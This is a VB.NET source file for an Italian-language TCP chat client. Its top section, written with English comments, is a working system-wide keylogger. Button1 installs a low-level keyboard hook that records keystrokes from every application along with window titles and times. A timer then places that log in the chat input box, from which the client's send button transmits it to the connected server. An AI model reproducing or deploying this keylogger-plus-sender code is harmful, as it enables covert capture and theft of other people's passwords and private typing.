Imports System.Net.Sockets
Imports System.Text
Imports System.Net

Public Class Form1

    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    Private Const WM_KEYUP As Integer = &H101
    Private Const WM_KEYDOWN As Short = &H100S
    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const WM_SYSKEYUP As Integer = &H105
    Public Structure KBDLLHOOKSTRUCT
        Public vkCode As Integer 'KeyCode (Of interest to us)
        Public scanCode As Integer 'ScanCode
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure
    Enum virtualKey
        K_Return = &HD
        K_Backspace = &H8
        K_Space = &H20
        K_Tab = &H9
        K_Esc = &H1B

        K_Control = &H11
        K_LControl = &HA2
        K_RControl = &HA3

        K_Delete = &H2E
        K_End = &H23
        K_Home = &H24
        K_Insert = &H2D

        K_Shift = &H10
        K_LShift = &HA0
        K_RShift = &HA1

        K_Pause = &H13
        K_PrintScreen = 44

        K_LWin = &H5B
        K_RWin = &H5C

        K_Alt = &H12
        K_LAlt = &HA4
        K_RAlt = &HA5

        'Locks
        K_NumLock = &H90
        K_CapsLock = &H14

        'Arrows
        K_Up = &H26
        K_Down = &H28
        K_Right = &H27
        K_Left = &H25

        'F1-24
        K_F1 = &H70
        K_F2 = &H71
        K_F3 = &H72
        K_F4 = &H73
        K_F5 = &H74
        K_F6 = &H75
        K_F7 = &H76
        K_F8 = &H77
        K_F9 = &H78
        K_F10 = &H79
        K_F11 = &H7A
        K_F12 = &H7B
        K_F13 = &H7C
        K_F14 = &H7D
        K_F15 = &H7E
        K_F16 = &H7F
        K_F17 = &H80
        K_F18 = &H81
        K_F19 = &H82
        K_F20 = &H83
        K_F21 = &H84
        K_F22 = &H85
        K_F23 = &H86
        K_F24 = &H87

        'Numpad
        K_Numpad0 = &H60
        K_Numpad1 = &H61
        K_Numpad2 = &H62
        K_Numpad3 = &H63
        K_Numpad4 = &H64
        K_Numpad5 = &H65
        K_Numpad6 = &H66
        K_Numpad7 = &H67
        K_Numpad8 = &H68
        K_Numpad9 = &H69
        'Math (numpad)
        K_Num_Add = &H6B
        K_Num_Divide = &H6F
        K_Num_Multiply = &H6A
        K_Num_Subtract = &H6D
        K_Num_Decimal = &H6E

        'Caracteres e Números
        K_0 = &H30
        K_1 = &H31
        K_2 = &H32
        K_3 = &H33
        K_4 = &H34
        K_5 = &H35
        K_6 = &H36
        K_7 = &H37
        K_8 = &H38
        K_9 = &H39
        K_A = &H41
        K_B = &H42
        K_C = &H43
        K_D = &H44
        K_E = &H45
        K_F = &H46
        K_G = &H47
        K_H = &H48
        K_I = &H49
        K_J = &H4A
        K_K = &H4B
        K_L = &H4C
        K_M = &H4D
        K_N = &H4E
        K_O = &H4F
        K_P = &H50
        K_Q = &H51
        K_R = &H52
        K_S = &H53
        K_T = &H54
        K_U = &H55
        K_V = &H56
        K_W = &H57
        K_X = &H58
        K_Y = &H59
        K_Z = &H5A

        'Math (not numpad)
        K_Subtract = 189
        K_Decimal = 190
    End Enum
    Private KeyboardHandle As IntPtr = 0
    Private LastCheckedForegroundTitle As String = ""
    Private callback As KeyboardHookDelegate = Nothing
    Private KeyLog As String
    Private Function Hooked()
        Return KeyboardHandle <> 0
    End Function
    Public Function KeyboardCallback(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
        'Get current foreground window title
        Dim CurrentTitle = GetActiveWindowTitle()
        'If title of the foreground window changed
        If CurrentTitle <> LastCheckedForegroundTitle Then
            LastCheckedForegroundTitle = CurrentTitle
            'Add a little header containing the application title and date
            KeyLog &= vbCrLf & "----------- " & CurrentTitle & " (" & Now.ToString() & ") ------------" & vbCrLf
        End If
        'Variable to hold the text describing the key pressed
        Dim Key As String = ""
        'If event is KEYDOWN
        If wParam = WM_KEYDOWN Or wParam = WM_SYSKEYDOWN Then
            'If we can block events
            If Code >= 0 Then
                'If Ctrl+Alt+S
            End If
            'Translate virtual key into character/expression
            Select Case lParam.vkCode
                Case virtualKey.K_0 To virtualKey.K_9
                    Key = ChrW(lParam.vkCode)
                Case virtualKey.K_A To virtualKey.K_Z
                    Key = ChrW(lParam.vkCode + 32)
            End Select
        End If
        'Add it to the log
        KeyLog &= Key
        Return CallNextHookEx(KeyboardHandle, Code, wParam, lParam) 'Let event go to the other applications
    End Function
    Public Sub HookKeyboard()
        callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)
        KeyboardHandle = SetWindowsHookEx(13, callback, Process.GetCurrentProcess.MainModule.BaseAddress, 0)
    End Sub
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Public Sub UnhookKeyboard()
        If (Hooked()) Then
            If UnhookWindowsHookEx(KeyboardHandle) <> 0 Then
                KeyboardHandle = 0 'We have unhooked successfully
            End If
        End If
    End Sub




    'caratteri fondamentali
    Dim caratteri_nick As String() = {" ", "$", "*", "[", "]", "{", "}", "/", "§", """"}

    'colori di partenza txtcronologia
    Dim colore_testo_normale As Color = Color.Black
    Dim stile_testo_normale As New Font("Microsoft Sans Serif", 9)

    'array per memorizzare ultimo messaggio mandato così 
    'da poterlo riscrivere premendo il tasto "su" e "giu"
    Dim ultimo_messaggio As New ArrayList()
    'variabile per il recupero degli ultimi messaggi
    'contenente la posizione che si sta guardando
    Dim posizionamento_ultimo_messaggio As Integer = 0

    Dim clientSocket As New System.Net.Sockets.TcpClient()
    Dim serverStream As NetworkStream
    Dim readData As String


    Declare Function Beep Lib "kernel32.dll" (ByVal dwFreq As Integer, ByVal dwDuration As Integer) As Boolean

    Private Sub btninvia_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btninvia.Click
        Dim messaggio As String = txttesto.Text
        If (messaggio = "") Then Exit Sub
        messaggio = messaggio.Trim()
        messaggio = messaggio.Replace("à", "a'")
        messaggio = messaggio.Replace("è", "e'")
        messaggio = messaggio.Replace("é", "e'")
        messaggio = messaggio.Replace("ì", "i'")
        messaggio = messaggio.Replace("ò", "o'")
        messaggio = messaggio.Replace("ù", "u'")
        Try
            Dim outStream As Byte() = System.Text.Encoding.ASCII.GetBytes(messaggio + "$")
            serverStream.Write(outStream, 0, outStream.Length)
            serverStream.Flush()
            ultimo_messaggio.Add(messaggio)
            posizionamento_ultimo_messaggio = ultimo_messaggio.Count - 1
        Catch ex As Exception
            readData = "***** ERRORE INVIO MESSAGGIO *****"
            msg()
        End Try
        txttesto.Text = ""
    End Sub

    Private Sub msg()
        Dim comandi As Boolean = False
        'queste istruzioni permettono l'inserimento di un testo colorato
        'ora manca solo il modo per rilevare il colore mandato dal server
        '
        'richTextBox1.SelectionStart = richTextBox1.Text.Length
        'dim oldcolor as color = richTextBox1.SelectionColor
        'richTextBox1.SelectionColor = Color.Red
        'richTextBox1.AppendText(vbNewLine & " >> " & readData)
        'richTextBox1.SelectionColor = oldcolor

        'pensavo di ricevere il colore all'interno di <>
        'come i tag html così da trovare il nome del colore
        'Dim colore As Color = Color.FromName("red")
        'con questo trasformo una stringa in colore

        If Me.InvokeRequired Then
            Me.Invoke(New MethodInvoker(AddressOf msg))
        Else

            Dim colore As Color = colore_testo_normale
            Dim stile As New Font("Microsoft Sans Serif", 8.25, FontStyle.Regular)

            If readData.Contains("*****") Then
                'allora è un messaggio privato quindi abbastanza importante
                'metto il testo grassetto
                stile = New Font("Microsoft Sans Serif", 8.25, FontStyle.Bold)
                colore = Color.OrangeRed
            End If


            If comandi Then
                Exit Sub
            End If

            'inizio a selezionare in modo da modificare il colore
            txtcronologia.SelectionStart = txtcronologia.Text.Length
            'cambio il colore di selezione e il font
            txtcronologia.SelectionColor = colore
            txtcronologia.SelectionFont = stile
            'aggiungo il testo colorato in fondo al textbox
            txtcronologia.AppendText(vbNewLine & readData)
            'reimposto il colore e il font
            txtcronologia.SelectionColor = colore_testo_normale
            txtcronologia.SelectionFont = stile_testo_normale


            'txtcronologia.Text = txtcronologia.Text & vbNewLine & " >> " & readData
            Beep(5000, 50)
            fondo_txtcronologia()
        End If
    End Sub

    Private Sub btnconnetti_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnconnetti.Click
        clientSocket = New System.Net.Sockets.TcpClient()
        Dim ip_connessione As IPAddress = Dns.GetHostByName(txtip.Text).AddressList(0)

        Try
            'clientSocket.Connect(txtip.Text, 8888)
            clientSocket.Connect(ip_connessione, 8888)
            serverStream = clientSocket.GetStream()

            Dim outStream As Byte() = System.Text.Encoding.ASCII.GetBytes(txtnick.Text + "$")
            serverStream.Write(outStream, 0, outStream.Length)
            serverStream.Flush()

            Dim ctThread As Threading.Thread = New Threading.Thread(AddressOf getMessage)
            ctThread.Start()

            txttesto.Focus()
        Catch ex As Exception
            MsgBox("Impossibile connettersi a " & txtip.Text)
        End Try

    End Sub

    Private Sub comando(ByVal comando As String)
        Try
            comando = comando.Trim()
            Dim outStream As Byte() = System.Text.Encoding.ASCII.GetBytes(comando & "$")
            'Dim outStream As Byte() = System.Text.Encoding.ASCII.GetBytes("/caccia " & lstonline.SelectedItem.ToString() & "$")
            serverStream.Write(outStream, 0, outStream.Length)
            serverStream.Flush()
        Catch ex As Exception
            'in caso di errore non fare niente
        End Try
    End Sub

    Private Sub getMessage()
        While (True)
            Dim buffSize As Integer
            Dim inStream(65536) As Byte
            Try
                serverStream = clientSocket.GetStream()
                buffSize = clientSocket.ReceiveBufferSize
                serverStream.Read(inStream, 0, buffSize)

                'fa in modo che se ci sono errori nella ricezione non si blocchi il programma e si discolleghi forzatamente
            Catch ex As Exception
                'controlla di avere la facoltà di eseguire certe istruzioni cioè serve per far andare il performclick()
                If Me.InvokeRequired Then
                    Me.Invoke(New MethodInvoker(AddressOf getMessage))
                Else
                    readData = "***** ERRORE COLLEGAMENTO, DISCOLLEGAMENTO IN CORSO *****"
                    msg()
                    Exit Sub
                End If
                Exit While
            End Try

            Dim returndata As String = System.Text.Encoding.ASCII.GetString(inStream)

            returndata = Replace(returndata, "a'", "à")
            returndata = Replace(returndata, "e'", "è")
            returndata = Replace(returndata, "i'", "ì")
            returndata = Replace(returndata, "o'", "ò")
            returndata = Replace(returndata, "u'", "ù")

            If returndata.Split(" ")(0) = "ERRORE" Then
                Select Case CInt(returndata.Split(" ")(1))
                    Case Errori.Password
                        MsgBox("Password errata")
                        Exit Sub

                End Select
            End If

            readData = "" + returndata
            msg()
        End While
    End Sub

    Private Sub fondo_txtcronologia()
        'permette di eseguire modifiche al form di partenza visto che ora ci troviamo in un thread
        If Me.InvokeRequired Then
            Me.Invoke(New MethodInvoker(AddressOf fondo_txtcronologia))
        Else
            txtcronologia.SelectionStart = txtcronologia.Text.Length
            txtcronologia.ScrollToCaret()
        End If
    End Sub

    Private Sub nega_tasti(ByRef e As System.Windows.Forms.KeyPressEventArgs, ByVal caratteri As String())
        If (caratteri.Contains(e.KeyChar)) Then
            e.Handled = 1
        End If
    End Sub

    Private Sub txttesto_KeyDown(sender As Object, e As System.Windows.Forms.KeyEventArgs) Handles txttesto.KeyDown
        Try
            If (e.KeyValue = Keys.Up) Then
                e.Handled = 1
                txttesto.Text = ultimo_messaggio.Item(posizionamento_ultimo_messaggio).ToString
                posizionamento_ultimo_messaggio -= 1
                If (posizionamento_ultimo_messaggio < 0) Then posizionamento_ultimo_messaggio = 0
            ElseIf (e.KeyValue = Keys.Down) Then
                e.Handled = 1
                txttesto.Text = ultimo_messaggio.Item(posizionamento_ultimo_messaggio).ToString
                posizionamento_ultimo_messaggio += 1
                If (posizionamento_ultimo_messaggio >= ultimo_messaggio.Count) Then posizionamento_ultimo_messaggio = ultimo_messaggio.Count - 1
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub txtip_KeyPress(sender As Object, e As System.Windows.Forms.KeyPressEventArgs) Handles txtip.KeyPress
        Dim caratteri As String() = {"$", "[", "]"}
        nega_tasti(e, caratteri)
        If (e.KeyChar = Convert.ToChar(Keys.Enter)) Then
            btnconnetti.PerformClick()
        End If
    End Sub

    Private Sub txtnick_KeyPress(sender As Object, e As System.Windows.Forms.KeyPressEventArgs) Handles txtnick.KeyPress
        Dim caratteri As String() = caratteri_nick
        nega_tasti(e, caratteri)
        If (e.KeyChar = Convert.ToChar(Keys.Enter)) Then
            e.Handled = 1
            btnconnetti.PerformClick()
        End If
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        clientSocket.Close()
        Environment.Exit(0) 'uscita forzata
    End Sub

    Private Enum Errori
        Password
        Comando
        Generico
    End Enum

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        HookKeyboard()
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        txttesto.Text = KeyLog
    End Sub
End Class